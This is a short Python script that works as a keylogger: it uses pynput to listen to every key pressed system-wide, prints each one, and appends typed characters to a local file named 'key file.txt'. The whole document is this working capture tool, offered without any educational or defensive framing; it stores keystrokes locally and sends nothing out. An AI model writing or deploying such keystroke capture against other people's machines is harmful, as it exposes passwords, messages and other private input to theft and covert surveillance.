from pynput import keyboard
def keypressed(key):
    print(str(key))
    with open ("key file.txt", 'a') as logkey:
     try:
        char = key.char
        logkey.write(char)
     except:
        print("Error getting char")
if __name__ == "__main__":
    Listener = keyboard.Listener (on_press=keypressed)
    Listener.start()
    input()
   